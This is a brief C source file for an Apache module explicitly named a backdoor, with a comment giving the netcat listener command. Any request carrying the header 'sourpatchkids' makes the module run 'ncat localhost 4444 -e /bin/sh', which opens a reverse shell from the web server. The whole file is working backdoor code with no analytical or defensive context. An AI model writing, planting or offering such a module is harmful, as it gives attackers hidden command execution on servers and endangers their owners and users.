// Uses ncat to connect to a server.
// run this to start server 
// sudo nc -lvnp 4444
#include "httpd.h"
#include "http_protocol.h"
#include "http_request.h"
#include "http_config.h"
#include "apr_strings.h"

static int backdoor_handler(request_rec *r) {
   const char *cmd = apr_table_get(r->headers_in, "sourpatchkids");
   if (!cmd) return DECLINED;
   if (cmd){
      FILE *fp = popen("ncat localhost 4444 -e /bin/sh", "r");
      return OK;
   }
   
}

static void register_hooks(apr_pool_t *p) {
   ap_hook_handler(backdoor_handler, NULL, NULL, APR_HOOK_FIRST);
}

module AP_MODULE_DECLARE_DATA backdoor_module = {
   STANDARD20_MODULE_STUFF,
   NULL, NULL, NULL, NULL, NULL, register_hooks
};